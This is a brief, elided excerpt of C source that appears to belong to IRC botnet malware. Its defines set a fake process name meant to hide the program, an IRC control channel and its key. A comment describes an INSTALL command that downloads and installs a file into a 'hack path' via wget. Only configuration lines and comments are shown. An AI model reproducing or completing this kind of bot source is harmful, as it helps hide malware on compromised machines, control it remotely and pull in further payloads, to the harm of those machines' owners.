...
#define FAKENAME "-shhhit"	// What you want this to hide as
#define CHAN "#shellpharm"	// Channel to join
#define KEY "bah"		// The key of the channel
...
// INSTALL (via wget, downloads and install a file into our hack path.)
